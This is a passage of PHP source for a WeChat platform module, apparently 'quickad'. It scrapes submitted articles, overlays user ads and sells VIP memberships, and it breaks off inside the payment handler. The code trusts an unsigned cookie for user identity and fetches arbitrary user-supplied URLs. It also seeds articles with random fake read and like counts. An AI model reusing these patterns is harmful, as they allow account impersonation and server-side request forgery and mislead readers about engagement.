<?php
defined('IN_IA') or exit('Access Denied');
include "model.php";
include "templateMessage.php";
define('RES', '../addons/weisrc_quickad/template/');
require  'inc/func/core.php';

class weisrc_quickadModuleSite extends Core
{
    function __construct()
    {
        global $_W, $_GPC;
        $this->serverip = getServerIP();
        $this->_fromuser = $_W['fans']['from_user']; //debug
        if ($_SERVER['HTTP_HOST'] == '127.0.0.1' || $_SERVER['HTTP_HOST'] == '192.168.1.101') {
            $this->_fromuser = 'debug';
        } else {
        }

        $this->_uniacid = $_W['uniacid'];
        $account = $_W['account'];

        $this->_auth2_openid = 'auth2_openid_' . $_W['uniacid'];
        $this->_auth2_nickname = 'auth2_nickname_' . $_W['uniacid'];
        $this->_auth2_headimgurl = 'auth2_headimgurl_' . $_W['uniacid'];

        $this->_appid = '';
        $this->_appsecret = '';
        $this->_accountlevel = $account['level']; //是否为高级号

        if (isset($_COOKIE[$this->_auth2_openid])) {
            $this->_fromuser = $_COOKIE[$this->_auth2_openid];
        }

        if ($this->_accountlevel < 4) {
            $setting = uni_setting($this->_uniacid);
            $oauth = $setting['oauth'];
            if (!empty($oauth) && !empty($oauth['account'])) {
                $this->_account = account_fetch($oauth['account']);
                $this->_appid = $this->_account['key'];
                $this->_appsecret = $this->_account['secret'];
            }
        } else {
            $this->_appid = $_W['account']['key'];
            $this->_appsecret = $_W['account']['secret'];
        }
    }

    //首页
    public function doMobileIndex()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

        $method = 'index'; //method
        $host = $this->getOAuthHost();
        $authurl = $host . 'app/' . $this->createMobileUrl($method, array(), true) . '&authkey=1';
        $url = $host . 'app/' . $this->createMobileUrl($method, array(), true);
        if (isset($_COOKIE[$this->_auth2_openid])) {
            $from_user = $_COOKIE[$this->_auth2_openid];
            $nickname = $_COOKIE[$this->_auth2_nickname];
            $headimgurl = $_COOKIE[$this->_auth2_headimgurl];
        } else {
            if (isset($_GPC['code'])) {
                $userinfo = $this->oauth2($authurl);
                if (!empty($userinfo)) {
                    $from_user = $userinfo["openid"];
                    $nickname = $userinfo["nickname"];
                    $headimgurl = $userinfo["headimgurl"];
                } else {
                    message('授权失败!');
                }
            } else {
                if (!empty($this->_appsecret)) {
                    $this->getCode($url);
                }
            }
        }

        $setting = $this->getSetting();
        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
//        if ($this->_accountlevel == 4) {
        if (empty($fans) && !empty($from_user)) {
            $insert = array(
                'uniacid' => $uniacid,
                'from_user' => $from_user,
                'nickname' => $nickname,
                'headimgurl' => $headimgurl,
                'dateline' => TIMESTAMP
            );
            $taste_vip = intval($setting['taste_vip']);
            if ($taste_vip > 0) {
                $insert['is_vip'] = 1;
                $insert['endtime'] = strtotime('+' . $taste_vip . ' day');
            }

            pdo_insert($this->table_fans, $insert);
        } else {
            $update = array(
                'nickname' => $nickname,
                'headimgurl' => $headimgurl,
            );
            pdo_update($this->table_fans, $update, array('id' => $fans['id']));
        }
        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
//        }
        $isvip = 0;
        if ($fans['is_vip'] == 1) {
            if (TIMESTAMP < $fans['endtime']) {
                $second = $fans['endtime'] - TIMESTAMP;
                if ($second > 0) {
                    $isvip = 1;
                    $day = floor($second / (3600 * 24));
                }
            }
        }

        $total = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_article) . " WHERE uniacid = :uniacid AND from_user=:from_user ", array(':uniacid' => $uniacid, ':from_user' => $from_user));

        $readcount = pdo_fetchcolumn("SELECT sum(readcount) FROM " . tablename($this->table_article) . " WHERE uniacid = :uniacid AND from_user=:from_user ", array(':uniacid' => $uniacid, ':from_user' => $from_user));

        $sharecount = pdo_fetchcolumn("SELECT sum(sharecount) FROM " . tablename($this->table_article) . " WHERE uniacid = :uniacid AND from_user=:from_user ", array(':uniacid' => $uniacid, ':from_user' => $from_user));

        $setting = $this->getSetting();
        $title = empty($setting['title']) ? '一秒广告' : $setting['title'];
        $share_title = trim($setting['share_title']);
        $share_desc = trim($setting['share_desc']);
        $share_url = empty($setting['share_url']) ? $_W['siteroot'] . 'app/' . $this->createMobileUrl('index', array(), true) : trim($setting['share_url']);
        $share_image = tomedia($setting['share_image']);

        include $this->template('index');
    }

    public function doMobileShare()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

        if (empty($from_user)) { //登录
            $this->result("您还没登录!", $this->createMobileUrl('index', array(), true));
        }
        $id = intval($_GPC['id']);
        $article = pdo_fetch("SELECT * FROM " . tablename($this->table_article) . " WHERE id=:id LIMIT 1", array(':id' => $id));

        if (empty($article)) {
            $this->result("文章不存在!", $this->createMobileUrl('index', array(), true));
        } else {
            pdo_update($this->table_article, array('sharecount' => $article['sharecount'] + 1), array('id' => $article['id']));
        }
        $url = $this->createMobileUrl('miaotie', array('id' => $id), true);
        header("location:$url");
    }

    public function doMobileSubmit()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

        if (empty($from_user)) { //登录
            $this->result("您还没登录!", $this->createMobileUrl('index', array(), true));
        }
        $url = trim($_GPC['url']);
        if (empty($url)) {
            $this->result("请输入文章网址!", $this->createMobileUrl('index', array(), true));
        }
        if (!($this->is_url(trim($url)))) {
            $this->result("网址不正确!", $this->createMobileUrl('index', array(), true));
        }

        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        if (empty($fans)) {
            $this->result("您还没登录!", $this->createMobileUrl('index', array(), true));
        }
        if ($fans['status'] == 0) {
            $this->result("您的帐号已经被冻结了!", $this->createMobileUrl('index', array(), true));
        }
        if (strstr($url, 'https://view.inews.qq.com')) {
            $title = $this->getQQTitle($url);
        } else if (strstr($url, 'http://xw.qq.com')) {
            $title = $this->getQQTitle2($url);
        } else {
            $title = $this->getTitle($url);
        }

        if (empty($title)) {
            $this->result("取不到文章的标题!!", $this->createMobileUrl('index', array(), true));
        }

        $article = pdo_fetch("SELECT * FROM " . tablename($this->table_article) . " WHERE fansid=:fansid AND url=:url LIMIT 1", array(':fansid' => $fans['id'], ':url' => $url));
        if (!empty($article)) {
            $this->result("贴广告成功", $this->createMobileUrl('miaotie', array('id' => $article['id']), true));
        }

        $setting = $this->getSetting();
        $read_min = 10000;
        $read_max = 30000;
        $praise_min = 1;
        $praise_max = 2000;
        if (!empty($setting)) {
            $read_min = $setting['read_min'];
            $read_max = $setting['read_max'];
            $praise_min = $setting['praise_min'];
            $praise_max = $setting['praise_max'];
        }

        $insert = array(
            'uniacid' => $uniacid,
            'fansid' => $fans['id'],
            'from_user' => $from_user,
            'title' => $title,
            'url' => $url,
            'default_read' => rand($read_min, $read_max),
            'default_praise' => rand($praise_min, $praise_max),
            'dateline' => TIMESTAMP
        );
        pdo_insert($this->table_article, $insert);
        $id = pdo_insertid();
        if ($id > 0) {
            $this->result("贴广告成功", $this->createMobileUrl('miaotie', array('id' => $id), true));
        } else {
            $this->result("网址不正确", $this->createMobileUrl('index', array(), true));
        }
    }

    public function getTitle($url)
    {
        $data = file_get_contents($url);
        $pos = strpos($data, 'utf-8');
//        if($pos===false){$data = iconv("gbk","utf-8",$data);}
        preg_match("/<title>(.*)<\/title>/i", $data, $title);
        return $title[1];
    }

    public function getQQTitle($url)
    {
        load()->func('communication');
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($c);
        curl_close($c);
        $pos = strpos($data, 'utf-8');
//        if($pos===false){$data = iconv("gbk","utf-8",$data);}
        preg_match("/<p class=\"title\" align=\"left\">(.*)<\/p>/i", $data, $title);
        return $title[1];
    }

    public function getQQTitle2($url)
    {
        load()->func('communication');
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($c);
        curl_close($c);
        $pos = strpos($data, 'utf-8');
//        if($pos===false){$data = iconv("gbk","utf-8",$data);}
        preg_match("/<h1 class=\"title\">(.*)<\/h1>/i", $data, $title);
        return $title[1];
    }

    function getNeedBetween($kw1, $mark1, $mark2)
    {
        $kw = $kw1;
        $kw = '123' . $kw . '123';
        $st = stripos($kw, $mark1);
        echo 'head' . $st;
        $ed = stripos($kw, $mark2);
        echo 'end' . $ed;
        if (($st == false || $ed == false) || $st >= $ed)
            return 0;
        $kw = substr($kw, ($st + 1), ($ed - $st - 1));
        return $kw;
    }

    public function getContent($url)
    {
        $contents = file_get_contents($url);
        $contents = explode('js_article', $contents);
        $contents = $contents[1];
        $contents = explode('<script>window.moon_map', $contents);
        $contents = $contents[0];
        $contents = '<div id="js_article' . $contents;
        return $contents;
    }

    public function getContent2($url)
    {
        $contents = file_get_contents($url);
        $contents = explode('<title>', $contents);
        $contents = $contents[1];
//        $contents = explode('<script>window.moon_map', $contents);
//        $contents = $contents[0];
        $contents = '<title>' . $contents;
        return $contents;
    }

    public function doMobileMiaotie()
    {
        global $_W, $_GPC;
//        $remote_url = $_W['siteroot'] . 'app/' . $this->createMobileUrl('GetRemoteImg', array(), true);
        $remote_url = "http://rewen.v0086.cc/showpic.asp?url=";



        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;
        $followuser = $_GPC['followuser'];

        $id = intval($_GPC['id']);
        $setting = $this->getSetting();

        $is_show_ad = 1;
        if ($setting['is_secondary_show'] == 2) {
            $method = 'miaotie';//method
            $host = $this->getOAuthHost();
            $authurl = $host . 'app/' . $this->createMobileUrl($method, array('id' => $id, 'followuser' => $followuser), true) .
                '&authkey=1';
            $url = $host . 'app/' . $this->createMobileUrl($method, array('id' => $id, 'followuser' => $followuser), true);
            if (isset($_COOKIE[$this->_auth2_openid])) {
                $from_user = $_COOKIE[$this->_auth2_openid];
                $nickname = $_COOKIE[$this->_auth2_nickname];
                $headimgurl = $_COOKIE[$this->_auth2_headimgurl];
            } else {
                if (isset($_GPC['code'])) {
                    $userinfo = $this->oauth2($authurl);
                    if (!empty($userinfo)) {
                        $from_user = $userinfo["openid"];
                        $nickname = $userinfo["nickname"];
                        $headimgurl = $userinfo["headimgurl"];
                    } else {
                        message('授权失败!');
                    }
                } else {
                    if (!empty($this->_appsecret)) {
                        $this->getCode($url);
                    }
                }
            }
        }

        $article = pdo_fetch("SELECT * FROM " . tablename($this->table_article) . " WHERE id=:id LIMIT 1", array(':id' => $id));
        if (empty($article)) {
            $this->result("文章不存在!", $this->createMobileUrl('index', array(), true));
        } else {
            pdo_update($this->table_article, array('readcount' => floatval($article['readcount']) + 0.5, 'default_read' => $article['default_read'] + 1), array('id' => $article['id']));
            $article = pdo_fetch("SELECT * FROM " . tablename($this->table_article) . " WHERE id=:id LIMIT 1", array(':id' => $id));
        }
        if ($setting['is_secondary_show'] == 2) {
            if ($followuser == $article['from_user']) {
                $is_show_ad = 0;
            }
        }

        $url = $article['url'];
        if (strstr($article['url'], 'http://mp.weixin.qq') || strstr($url, 'https://mp.weixin.qq')) {
            $content = $this->getContent($url);
//            $content = str_replace('http://mmbiz.qpic.cn/', $remote_url . '&url=http://mmbiz.qpic.cn/', $content);
            $content = str_replace('http://mmbiz.qpic.cn/', $remote_url . 'http://mmbiz.qpic.cn/', $content);
        }
        $is_toutiao = 0;
        $admode = empty($setting) ? 1 : $setting['admode'];
//        if (strstr($article['url'], 'http://m.toutiao.com')) {
//            $content = $this->getContent2($url);
//            $is_toutiao = 1;
//        }

        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE id=:fansid AND status=1 LIMIT 1", array(':fansid' => $article['fansid']));
        if ($fans['status'] == 0) {
            $this->result("您的帐号已经被冻结了!", $this->createMobileUrl('index', array(), true));
        }

        $qrcode = tomedia($setting['qrcode']);
        $ad = tomedia($setting['ad']);
        $ad_url = $setting['ad_url'];
        $title1 = empty($setting) ? "1秒把广告贴到朋友圈" : $setting['title1'];
        $title2 = empty($setting) ? "最牛的朋友圈宣传工具" : $setting['title2'];
        $mobile = $setting['mobile'];

        if ($fans['is_vip'] == 1) {
            if (TIMESTAMP > $fans['starttime'] && TIMESTAMP < $fans['endtime']) {
                $admode = $fans['admode'];
                $qrcode = empty($fans['qrcode']) ? $qrcode : tomedia($fans['qrcode']);
                $ad = empty($fans['ad']) ? $ad : tomedia($fans['ad']);
                $ad_url = $fans['ad_url'];
                $title1 = empty($fans['title1']) ? $title1 : $fans['title1'];
                $title2 = empty($fans['title2']) ? $title2 : $fans['title2'];
                $mobile = empty($fans['mobile']) ? $mobile : $fans['mobile'];
            }
        }

        $title = empty($setting['title']) ? '一秒广告' : $setting['title'];
        //分享信息
        $share_title = $article['title'];
        $share_title = str_replace('&nbsp;', '', $share_title);
        $share_desc = $article['title'];

        if ($setting['is_secondary_show'] == 2) {
            $share_url = $_W['siteroot'] . 'app/' . $this->createMobileUrl('miaotie', array('id' => $id, 'followuser' => $from_user), true);
        } else {
            $share_url = $_W['siteroot'] . 'app/' . $this->createMobileUrl('miaotie', array('id' => $id), true);
        }
        $share_image = tomedia($setting['share_image']);


        $con = file_get_contents($url);
        if (strstr($url, 'http://mp.weixin.qq') || strstr($url, 'https://mp.weixin.qq')) {
            $pattern = "/msg_cdn_url = [\"](.*?)[\"]/";
            preg_match_all($pattern, $con, $match);
            for ($i = 0; $i < count($match[1]); $i++) {
                if (strstr($match[1][$i], 'http://') && !strstr($match[1][$i], 'head_50') && !strstr($match[1][$i], 'res.wx.qq.com')) {
                    $share_image = $match[1][$i];
                    break;
                }
            }

            $pattern = "/msg_desc = [\"](.*?)[\"]/";
            preg_match_all($pattern, $con, $match);

            for ($i = 0; $i < count($match[1]); $i++) {
                $share_desc = $match[1][0];
                $share_desc = str_replace('&nbsp;', '', $share_desc);
            }
        } else {
            $pattern = "/<[img|IMG].*?src=[\'|\"](.*?(?:[\.gif|\.jpg|\.png]))[\'|\"].*?[\/]?>/";
            $pattern = "/<[img|IMG].*?src=[\'|\"](.*?)[\'|\"].*?[\/]?>/";
            preg_match_all($pattern, $con, $match);
            for ($i = 0; $i < count($match[1]); $i++) {
                if (strstr($match[1][$i], 'http://') && !strstr($match[1][$i], 'head_50') && !strstr($match[1][$i], 'res.wx.qq.com')) {
                    $pic = $match[1][$i];
                    break;
                }
            }
            $share_image = $pic;
        }

        if (empty($share_image)) {
            $share_image = tomedia($setting['share_image']);
        }

//        if ($is_toutiao == 1) {
//            include $this->template('miaotie2');
//        } else {
            if ($admode == 1) {
                include $this->template('miaotie');
            } else {
                include $this->template('detail');
            }
//        }
    }

    function is_url($str)
    {
//        return preg_match("/^http:\/\/[A-Za-z0-9]+\.[A-Za-z0-9]+[\/=\?%\-&_~`@[\]\’:+!]*([^<>\"])*$/", $str);
        return preg_match("/^(http:\/\/|https:\/\/).*$/", $str);
    }

    public function doMobileHelp()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

        $method = 'help'; //method
        $host = $this->getOAuthHost();
        $authurl = $host . 'app/' . $this->createMobileUrl($method, array(), true) . '&authkey=1';
        $url = $host . 'app/' . $this->createMobileUrl($method, array(), true);
        if (isset($_COOKIE[$this->_auth2_openid])) {
            $from_user = $_COOKIE[$this->_auth2_openid];
            $nickname = $_COOKIE[$this->_auth2_nickname];
            $headimgurl = $_COOKIE[$this->_auth2_headimgurl];
        } else {
            if (isset($_GPC['code'])) {
                $userinfo = $this->oauth2($authurl);
                if (!empty($userinfo)) {
                    $from_user = $userinfo["openid"];
                    $nickname = $userinfo["nickname"];
                    $headimgurl = $userinfo["headimgurl"];
                } else {
                    message('授权失败!');
                }
            } else {
                if (!empty($this->_appsecret)) {
                    $this->getCode($url);
                }
            }
        }

        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        if ($this->_accountlevel == 4) {
            if (empty($fans) && !empty($nickname)) {
                $insert = array(
                    'uniacid' => $uniacid,
                    'from_user' => $from_user,
                    'nickname' => $nickname,
                    'headimgurl' => $headimgurl,
                    'dateline' => TIMESTAMP
                );
                pdo_insert($this->table_fans, $insert);
            }
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        }

        $setting = $this->getSetting();
        $title = empty($setting['title']) ? '一秒广告' : $setting['title'];
        $share_title = trim($setting['share_title']);
        $share_desc = trim($setting['share_desc']);
        $share_url = empty($setting['share_url']) ? $_W['siteroot'] . 'app/' . $this->createMobileUrl('index', array(), true) : trim($setting['share_url']);
        $share_image = tomedia($setting['share_image']);

        include $this->template('help');
    }

    public function doMobileList()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

        $method = 'list'; //method
        $host = $this->getOAuthHost();
        $authurl = $host . 'app/' . $this->createMobileUrl($method, array(), true) . '&authkey=1';
        $url = $host . 'app/' . $this->createMobileUrl($method, array(), true);
        if (isset($_COOKIE[$this->_auth2_openid])) {
            $from_user = $_COOKIE[$this->_auth2_openid];
            $nickname = $_COOKIE[$this->_auth2_nickname];
            $headimgurl = $_COOKIE[$this->_auth2_headimgurl];
        } else {
            if (isset($_GPC['code'])) {
                $userinfo = $this->oauth2($authurl);
                if (!empty($userinfo)) {
                    $from_user = $userinfo["openid"];
                    $nickname = $userinfo["nickname"];
                    $headimgurl = $userinfo["headimgurl"];
                } else {
                    message('授权失败!');
                }
            } else {
                if (!empty($this->_appsecret)) {
                    $this->getCode($url);
                }
            }
        }

        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        if ($this->_accountlevel == 4) {
            if (empty($fans) && !empty($nickname)) {
                $insert = array(
                    'uniacid' => $uniacid,
                    'from_user' => $from_user,
                    'nickname' => $nickname,
                    'headimgurl' => $headimgurl,
                    'dateline' => TIMESTAMP
                );
                pdo_insert($this->table_fans, $insert);
            }
        } else {
            if (empty($fans) && !empty($from_user)) {
                $insert = array(
                    'uniacid' => $uniacid,
                    'from_user' => $from_user,
                    'dateline' => TIMESTAMP
                );
                pdo_insert($this->table_fans, $insert);
            }
        }
        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));

        if ($fans['status'] == 0) {
            $this->result("您的帐号已经被冻结了!", $this->createMobileUrl('index', array(), true));
        }

        $list = pdo_fetchall("SELECT * FROM " . tablename($this->table_article) . " WHERE uniacid = :uniacid AND
        from_user=:from_user AND status=1 ORDER BY id
DESC LIMIT 50 ", array(':uniacid' => $uniacid, ':from_user' => $from_user));

        $setting = $this->getSetting();
        $title = empty($setting['title']) ? '一秒广告' : $setting['title'];
        $share_title = trim($setting['share_title']);
        $share_desc = trim($setting['share_desc']);
        $share_url = empty($setting['share_url']) ? $_W['siteroot'] . 'app/' . $this->createMobileUrl('index', array(), true) : trim($setting['share_url']);
        $share_image = tomedia($setting['share_image']);

        include $this->template('listinfo');
    }

    public function doMobileDeleteInfo()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

        if (empty($from_user)) { //登录
            $this->result("您还没登录!", $this->createMobileUrl('index', array(), true));
        }

        $id = intval($_GPC['id']);
        $article = pdo_fetch("SELECT * FROM " . tablename($this->table_article) . " WHERE id=:id AND
        from_user=:from_user  LIMIT
        1", array(':id' => $id, ':from_user' => $from_user));
        if (empty($article)) {
            $this->result('文章不存在！', $this->createMobileUrl('list', array(), true));
        }

        pdo_delete($this->table_article, array('id' => $id));
        $this->result("删除文章成功!", $this->createMobileUrl('list', array(), true));
    }

    public function doMobileSumbitInfo()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

        if (empty($from_user)) {
            $this->result("您还没登录!", $this->createMobileUrl('index', array(), true));
        }
        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        if (empty($fans)) {
            $this->result("您还没登录!", $this->createMobileUrl('index', array(), true));
        }
        if ($fans['status'] == 0) {
            $this->result("您的帐号已经被冻结了!", $this->createMobileUrl('index', array(), true));
        }

        $data = array(
            'title1' => trim($_GPC['title1']),
            'title2' => trim($_GPC['title2']),
            'mobile' => trim($_GPC['mobile']),
            'admode' => intval($_GPC['admode']),
            'ad_url' => trim($_GPC['ad_url'])
        );

        if (!empty($_FILES['qrcode']['name'])) {
            $data['qrcode'] = $this->uploadImg('qrcode');
        }
        if (!empty($_FILES['ad']['name'])) {
            $data['ad'] = $this->uploadImg('ad');
        }
        if (!empty($_GPC['ad_url']) && !($this->is_url(trim($_GPC['ad_url'])))) {
            $this->result("网址不正确!", $this->createMobileUrl('editinfo', array(), true));
        }
        pdo_update($this->table_fans, $data, array('id' => $fans['id']));
        $this->result("修改信息成功", $this->createMobileUrl('editinfo', array(), true));
    }

    public function doMobileeditinfo()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

        $method = 'editinfo'; //method
        $host = $this->getOAuthHost();
        $authurl = $host . 'app/' . $this->createMobileUrl($method, array(), true) . '&authkey=1';
        $url = $host . 'app/' . $this->createMobileUrl($method, array(), true);
        if (isset($_COOKIE[$this->_auth2_openid])) {
            $from_user = $_COOKIE[$this->_auth2_openid];
            $nickname = $_COOKIE[$this->_auth2_nickname];
            $headimgurl = $_COOKIE[$this->_auth2_headimgurl];
        } else {
            if (isset($_GPC['code'])) {
                $userinfo = $this->oauth2($authurl);
                if (!empty($userinfo)) {
                    $from_user = $userinfo["openid"];
                    $nickname = $userinfo["nickname"];
                    $headimgurl = $userinfo["headimgurl"];
                } else {
                    message('授权失败!');
                }
            } else {
                if (!empty($this->_appsecret)) {
                    $this->getCode($url);
                }
            }
        }

        $is_ios = false;
        if (strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') || strpos($_SERVER['HTTP_USER_AGENT'], 'iPad')) {
            $is_ios = true;
        }

        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        if ($this->_accountlevel == 4) {
            if (empty($fans) && !empty($nickname)) {
                $insert = array(
                    'uniacid' => $uniacid,
                    'from_user' => $from_user,
                    'nickname' => $nickname,
                    'headimgurl' => $headimgurl,
                    'dateline' => TIMESTAMP
                );
                pdo_insert($this->table_fans, $insert);
            }
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        }

        if ($fans['status'] == 0) {
            $this->result("您的帐号已经被冻结了!", $this->createMobileUrl('index', array(), true));
        }

        if ($fans['is_vip'] == 0) {
            $this->result("对不起，只有vip用户才能使用广告功能!", $this->createMobileUrl('index', array(), true));
        } else {
            if (TIMESTAMP < $fans['starttime'] || TIMESTAMP > $fans['endtime']) {
                $this->result("对不起，您的vip会员到期了，暂时不能使用广告功能!", $this->createMobileUrl('index', array(), true));
            }
        }

        $setting = $this->getSetting();
        $title = empty($setting['title']) ? '一秒广告' : $setting['title'];
        $share_title = trim($setting['share_title']);
        $share_desc = trim($setting['share_desc']);
        $share_url = empty($setting['share_url']) ? $_W['siteroot'] . 'app/' . $this->createMobileUrl('index', array(), true) : trim($setting['share_url']);
        $share_image = tomedia($setting['share_image']);
        include $this->template('editinfo');
    }

    public function doMobilezhifu()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;

//        $sn1 = pdo_fetchcolumn("SELECT COUNT(1) FROM " . tablename('weisrc_quickad_sn') . " WHERE status=0 AND uniacid=:uniacid ", array('uniacid' => $uniacid));
//        $sn1 = intval($sn1);
//        if ($sn1 <= 0) {
//            $this->result("商家暂时没有开通在线支付功能!", $this->createMobileUrl('index', array(), true));
//        }

        $setting = $this->getSetting();
        if ($setting['is_pay'] == 0) {
            $this->result("商家暂时没有开通在线支付功能!", $this->createMobileUrl('index', array(), true));
        }

        $method = 'zhifu';
        $host = $this->getOAuthHost();
        $authurl = $host . 'app/' . $this->createMobileUrl($method, array(), true) . '&authkey=1';
        $url = $host . 'app/' . $this->createMobileUrl($method, array(), true);
        if (isset($_COOKIE[$this->_auth2_openid])) {
            $from_user = $_COOKIE[$this->_auth2_openid];
            $nickname = $_COOKIE[$this->_auth2_nickname];
            $headimgurl = $_COOKIE[$this->_auth2_headimgurl];
        } else {
            if (isset($_GPC['code'])) {
                $userinfo = $this->oauth2($authurl);
                if (!empty($userinfo)) {
                    $from_user = $userinfo["openid"];
                    $nickname = $userinfo["nickname"];
                    $headimgurl = $userinfo["headimgurl"];
                } else {
                    message('授权失败!');
                }
            } else {
                if (!empty($this->_appsecret)) {
                    $this->getCode($url);
                }
            }
        }

        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        if ($this->_accountlevel == 4) {
            if (empty($fans) && !empty($nickname)) {
                $insert = array(
                    'uniacid' => $uniacid,
                    'from_user' => $from_user,
                    'nickname' => $nickname,
                    'headimgurl' => $headimgurl,
                    'dateline' => TIMESTAMP
                );
                pdo_insert($this->table_fans, $insert);
            }
            $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE from_user=:from_user AND uniacid=:uniacid LIMIT 1", array(':from_user' => $from_user, ':uniacid' => $uniacid));
        }
        if ($fans['status'] == 0) {
            $this->result("您的帐号已经被冻结了!", $this->createMobileUrl('index', array(), true));
        }

        $title = empty($setting['title']) ? '一秒广告' : $setting['title'];
        $share_title = trim($setting['share_title']);
        $share_desc = trim($setting['share_desc']);
        $share_url = empty($setting['share_url']) ? $_W['siteroot'] . 'app/' . $this->createMobileUrl('index', array(), true) : trim($setting['share_url']);
        $share_image = tomedia($setting['share_image']);

        include $this->template('zhifu');
    }

    public function doMobileAddToOrder()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $from_user = $this->_fromuser;
        $vipcount = intval($_GPC['vipcount']);

        if (empty($from_user)) {
            $this->result("您还没登录!", $this->createMobileUrl('index', array(), true));
        }

//        $sn1 = pdo_fetchcolumn("SELECT COUNT(1) FROM " . tablename('weisrc_quickad_sn') . " WHERE status=0 AND uniacid=:uniacid ", array('uniacid' => $uniacid));
//        $sn1 = intval($sn1);
//        if ($sn1 <= 0) {
//            $this->result("商家暂时没开通支付功能!", $this->createMobileUrl('index', array(), true));
//        }

        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE uniacid = :uniacid  AND from_user=:from_user ORDER BY `id` DESC limit 1", array(':uniacid' => $uniacid, ':from_user' => $from_user));

        if (empty($fans)) {
            $this->result("您还没登录!", $this->createMobileUrl('index', array(), true));
        }
        if ($fans['status'] == 0) {
            $this->result("您的帐号已经被冻结了!", $this->createMobileUrl('index', array(), true));
        }

        $totalprice = 1980;
        $setting = $this->getSetting();
        if ($setting['price']) {
            $price = floatval($setting['price']);
            if ($price > 0) {
                $totalprice = $price;
            }
        }

        if ($setting['viptype'] == 2) {
            if ($vipcount > 12 || $vipcount < 1) {
                $this->result("输入错误!", $this->createMobileUrl('index', array(), true));
            }
            if ($vipcount == 1) {
                $totalprice = floatval($setting['price1']);
            } else if ($vipcount == 3) {
                $totalprice = floatval($setting['price2']);
            } else if ($vipcount == 6) {
                $totalprice = floatval($setting['price3']);
            } else if ($vipcount == 12) {
                $totalprice = floatval($setting['price4']);
            }
        }
//        $order = pdo_fetch("SELECT * FROM " . tablename($this->table_order) . " WHERE uniacid = :uniacid  AND from_user=:from_user AND status=0 ORDER
//BY `id` DESC limit 1", array(':uniacid' => $uniacid, ':from_user' => $from_user));
//
//        if (!empty($order)) {
//            $orderid = $order['id'];
//        } else {
        $fansid = $fans['id'];
        $data = array(
            'uniacid' => $uniacid,
            'fansid' => $fansid,
            'from_user' => $from_user,
            'ordersn' => date('md') . sprintf("%04d", $fansid) . random(4, 1), //订单号
            'totalprice' => $totalprice, //总价
            'vipcount' => $vipcount,
            'paytype' => 0, //付款类型
            'status' => 0, //状态
            'dateline' => TIMESTAMP
        );
        pdo_insert($this->table_order, $data);
        $orderid = pdo_insertid();
//        }

        if (empty($orderid)) {
            $this->result("系统维护中!", $this->createMobileUrl('index', array(), true));
        } else {
            $url = $this->createMobileUrl('pay', array('orderid' => $orderid), true);
            header("location:$url");
        }
    }

    public function doMobilePay()
    {
        global $_W, $_GPC;
        checkauth();
        $orderid = intval($_GPC['orderid']);
        $order = pdo_fetch("SELECT * FROM " . tablename($this->table_order) . " WHERE id = :id", array(':id' => $orderid));
        if (!empty($order['status'])) {
            message('抱歉，您的订单已经付款或是被关闭，请重新进入付款！', $this->createMobileUrl('orderlist', array('storeid' => $order['storeid'])), 'error');
        }
        $params['tid'] = $orderid;
